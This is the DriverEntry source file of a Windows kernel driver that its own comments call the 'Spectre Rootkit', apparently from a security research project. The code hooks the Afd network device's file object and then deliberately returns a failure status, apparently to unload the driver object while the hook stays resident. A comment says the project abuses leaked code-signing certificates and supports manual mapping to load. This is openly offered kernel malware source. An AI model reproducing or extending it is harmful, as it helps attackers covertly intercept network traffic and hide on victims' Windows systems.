/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "common.h"	
#include "FileObjHook.h"

PFILE_OBJ_HOOK DeviceHook;

EXTERN_C_START

DRIVER_INITIALIZE DriverEntry;
NTSTATUS
DriverEntry (
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
    );

EXTERN_C_END

/**
	Initialize the Spectre Rootkit.
	@param DriverObject - The object associated with the driver.
	@param RegistryPath - The registry path of the driver.
	@return Status of driver initialization.
*/
NTSTATUS
DriverEntry (
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath
	)
{
	//
	// We don't know if these parameters are valid.
	// Although this project abuses leaked certificates by default,
	// this project is designed to work in several scenarios, including
	// scenarios such as manual mapping which may not result in a valid
	// driver object or registry path.
	//
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	DeviceHook = new (NonPagedPool, 'hFpS') FileObjHook(L"Afd", DirectHook, NULL);

	return STATUS_FAILED_DRIVER_ENTRY;
}